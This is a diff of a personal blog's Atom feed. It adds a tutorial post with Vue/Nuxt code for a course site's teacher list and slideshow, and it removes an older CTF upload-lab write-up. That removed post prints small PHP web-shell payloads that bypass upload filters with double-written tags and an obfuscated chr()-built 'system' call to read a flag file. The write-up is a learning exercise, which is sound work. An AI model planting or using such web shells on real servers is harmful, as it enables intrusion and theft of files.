+                      &lt;a href=&quot;/teacher/1&quot; title=&quot;姚晨&quot; class=&quot;fsize18 c-666&quot;
+                        &gt;姚 晨&lt;/a
+                      &gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;hLh30 txtOf tac&quot;&gt;
+                      &lt;span class=&quot;fsize14 c-999&quot;
+                        &gt;北京师范大学法学院副教授&lt;/span
+                      &gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;mt15 i-q-txt&quot;&gt;
+                      &lt;p class=&quot;c-999 f-fA&quot;&gt;
+                        北京师范大学法学院副教授、清华大学法学博士。自2004年至今已有9年
+                        的司法考试培训经验。长期从事司法考试辅导，深知命题规律，了解解题技巧。内容把握准确，授课重
+                        点明确，层次分明，调理清晰，将法条法理与案例有机融合，强调综合，深入浅出。
+                      &lt;/p&gt;
+                    &lt;/div&gt;
+                  &lt;/section&gt;
+                &lt;/li&gt;
+                &lt;li&gt;
+                  &lt;section class=&quot;i-teach-wrap&quot;&gt;
+                    &lt;div class=&quot;i-teach-pic&quot;&gt;
+                      &lt;a href=&quot;/teacher/1&quot; title=&quot;谢娜&quot;&gt;
+                        &lt;img
+                          alt=&quot;谢娜&quot;
+                          src=&quot;~/assets/photo/teacher/1442297919077.jpg&quot;
+                        /&gt;
+                      &lt;/a&gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;mt10 hLh30 txtOf tac&quot;&gt;
+                      &lt;a href=&quot;/teacher/1&quot; title=&quot;谢娜&quot; class=&quot;fsize18 c-666&quot;
+                        &gt;谢 娜&lt;/a
+                      &gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;hLh30 txtOf tac&quot;&gt;
+                      &lt;span class=&quot;fsize14 c-999&quot;
+                        &gt;资深课程设计专家，专注10年AACTP美
+                        国培训协会认证导师&lt;/span
+                      &gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;mt15 i-q-txt&quot;&gt;
+                      &lt;p class=&quot;c-999 f-fA&quot;&gt;
+                        十年课程研发和培训咨询经验，曾任国企人力资源经理、大型外企培训经
+                        理，负责企业大学和培训体系搭建；曾任专业培训机构高级顾问、研发部总监，为包括广东移动、东莞
+                        移动、深圳移动、南方电网、工商银行、农业银行、民生银行、邮储银行、TCL集团、清华大学继续教
+                        育学院、中天路桥、广西扬翔股份等超过200家企业提供过培训与咨询服务，并担任近50个大型项目的
+                        总负责人。
+                      &lt;/p&gt;
+                    &lt;/div&gt;
+                  &lt;/section&gt;
+                &lt;/li&gt;
+                &lt;li&gt;
+                  &lt;section class=&quot;i-teach-wrap&quot;&gt;
+                    &lt;div class=&quot;i-teach-pic&quot;&gt;
+                      &lt;a href=&quot;/teacher/1&quot; title=&quot;刘德华&quot;&gt;
+                        &lt;img
+                          alt=&quot;刘德华&quot;
+                          src=&quot;~/assets/photo/teacher/1442297927029.jpg&quot;
+                        /&gt;
+                      &lt;/a&gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;mt10 hLh30 txtOf tac&quot;&gt;
+                      &lt;a href=&quot;/teacher/1&quot; title=&quot;刘德华&quot; class=&quot;fsize18 c-666&quot;
+                        &gt;刘 德华&lt;/a
+                      &gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;hLh30 txtOf tac&quot;&gt;
+                      &lt;span class=&quot;fsize14 c-999&quot;
+                        &gt;上海师范大学法学院副教授&lt;/span
+                      &gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;mt15 i-q-txt&quot;&gt;
+                      &lt;p class=&quot;c-999 f-fA&quot;&gt;
+                        上海师范大学法学院副教授、清华大学法学博士。自2004年至今已有9年
+                        的司法考试培训经验。长期从事司法考试辅导，深知命题规律，了解解题技巧。内容把握准确，授课重
+                        点明确，层次分明，调理清晰，将法条法理与案例有机融合，强调综合，深入浅出。
+                      &lt;/p&gt;
+                    &lt;/div&gt;
+                  &lt;/section&gt;
+                &lt;/li&gt;
+                &lt;li&gt;
+                  &lt;section class=&quot;i-teach-wrap&quot;&gt;
+                    &lt;div class=&quot;i-teach-pic&quot;&gt;
+                      &lt;a href=&quot;/teacher/1&quot; title=&quot;周润发&quot;&gt;
+                        &lt;img
+                          alt=&quot;周润发&quot;
+                          src=&quot;~/assets/photo/teacher/1442297935589.jpg&quot;
+                        /&gt;
+                      &lt;/a&gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;mt10 hLh30 txtOf tac&quot;&gt;
+                      &lt;a href=&quot;/teacher/1&quot; title=&quot;周润发&quot; class=&quot;fsize18 c-666&quot;
+                        &gt;周 润发&lt;/a
+                      &gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;hLh30 txtOf tac&quot;&gt;
+                      &lt;span class=&quot;fsize14 c-999&quot;
+                        &gt;考研政治辅导实战派专家，全国考研政
+                        治命题研究组核心成员。&lt;/span
+                      &gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;mt15 i-q-txt&quot;&gt;
+                      &lt;p class=&quot;c-999 f-fA&quot;&gt;
+                        法学博士，北京师范大学马克思主义学院副教授，专攻毛泽东思想概论、
+                        邓小平理论，长期从事考研辅导。出版著作两部，发表学术论文30余篇，主持国家社会科学基金项目和
+                        教育部重大课题子课题各一项，参与中央实施马克思主义理论研究和建设工程项目。
+                      &lt;/p&gt;
+                    &lt;/div&gt;
+                  &lt;/section&gt;
+                &lt;/li&gt;
+              &lt;/ul&gt;
+              &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
+            &lt;/article&gt;
+            &lt;section class=&quot;tac pt20&quot;&gt;
+              &lt;a href=&quot;#&quot; title=&quot;全部讲师&quot; class=&quot;comm-btn c-btn-2&quot;&gt;全部讲师&lt;/a&gt;
+            &lt;/section&gt;
+          &lt;/div&gt;
+        &lt;/section&gt;
+      &lt;/div&gt;
+      &lt;!-- /网校名师 结束 --&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+&lt;/template&gt;
+&lt;script&gt;
+export default {};
+&lt;/script&gt;
+</code></pre>
+<h3 id="4-幻灯片插件">4、幻灯片插件</h3>
+<pre><code class="language-html">    &lt;!-- 幻灯片 开始 --&gt;
+    &lt;div v-swiper:mySwiper=&quot;swiperOption&quot;&gt;
+      &lt;div class=&quot;swiper-wrapper&quot;&gt;
+        &lt;div class=&quot;swiper-slide&quot; style=&quot;background: #040b1b&quot;&gt;
+          &lt;a target=&quot;_blank&quot; href=&quot;/&quot;&gt;
+            &lt;img
+              src=&quot;~/assets/photo/banner/1525939573202.jpg&quot;
+              alt=&quot;首
+页banner&quot;
+            /&gt;
+          &lt;/a&gt;
+        &lt;/div&gt;
+        &lt;div class=&quot;swiper-slide&quot; style=&quot;background: #040b1b&quot;&gt;
+          &lt;a target=&quot;_blank&quot; href=&quot;/&quot;&gt;
+            &lt;img
+              src=&quot;~/assets/photo/banner/153525d0ef15459596.jpg&quot;
+              alt=&quot;首
+页banner&quot;
+            /&gt;
+          &lt;/a&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+      &lt;div class=&quot;swiper-pagination swiper-pagination-white&quot;&gt;&lt;/div&gt;
+      &lt;div
+        class=&quot;swiper-button-prev swiper-button-white&quot;
+        slot=&quot;button-prev&quot;
+      &gt;&lt;/div&gt;
+      &lt;div
+        class=&quot;swiper-button-next swiper-button-white&quot;
+        slot=&quot;button-next&quot;
+      &gt;&lt;/div&gt;
+    &lt;/div&gt;
+    &lt;!-- 幻灯片 结束 --&gt;
+</code></pre>
+<p>script</p>
+<pre><code class="language-js">&lt;script&gt;
+export default {
+  data() {
+    return {
+      swiperOption: {
+        //配置分页
+        pagination: {
+          el: &quot;.swiper-pagination&quot;, //分页的dom节点
+        },
+        //配置导航
+        navigation: {
+          nextEl: &quot;.swiper-button-next&quot;, //下一页dom节点
+          prevEl: &quot;.swiper-button-prev&quot;, //前一页dom节点
+        },
+      },
+    };
+  },
+};
+&lt;/script&gt;
+</code></pre>
+<p>效果<br>
+<img src="https://crlrlc.github.io//post-images/1687271487499.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Day204.管理后台前端页面环境搭建]]></title>
         <id>https://crlrlc.github.io/post/day204qian-duan-ye-mian-huan-jing-da-jian/</id>
@@ -1952,33 +2725,6 @@ public R error(AchangException e){
 <img src="https://crlrlc.github.io//post-images/1604806941149.png" alt="" loading="lazy"><br>
 <img src="https://crlrlc.github.io//post-images/1604806947382.png" alt="" loading="lazy"><br>
 <img src="https://crlrlc.github.io//post-images/1604806951798.png" alt="" loading="lazy"></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[第四次打靶]]></title>
-        <id>https://crlrlc.github.io/post/di-si-ci-da-ba/</id>
-        <link href="https://crlrlc.github.io/post/di-si-ci-da-ba/">
-        </link>
-        <updated>2020-10-31T15:05:26.000Z</updated>
-        <content type="html"><![CDATA[<p>##在师兄的指导下，我进行了底四次靶场实验下面是步骤<br>
-<img src="https://crlrlc.github.io//post-images/1604156810423.png" alt="" loading="lazy"><br>
-<img src="https://crlrlc.github.io//post-images/1604156815676.png" alt="" loading="lazy"><br>
-<img src="https://crlrlc.github.io//post-images/1604156820417.png" alt="" loading="lazy"><br>
-##补充<br>
-upload3那题我失败了，原因是.htaccess没有双写，只是双写了1.aaa中的木马，<br>
-<img src="https://crlrlc.github.io//post-images/1604157027025.png" alt="" loading="lazy"><br>
-<img src="https://crlrlc.github.io//post-images/1604157109287.png" alt="" loading="lazy"><br>
-此外，我还知道了一个不用蚁剑的办法：<br>
-1.aaa<br>
-可以是<br>
-&lt;?pphphp<br>
-echo <code>cat /flag</code>;</p>
-<pre><code>也可以是
-&lt;  ?pphphp
-$a = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
-$a('cat /flag');
-
-这两个方法就直接访问就行了，不需要用蚁剑   </code></pre>
 ]]></content>
     </entry>
 </feed>
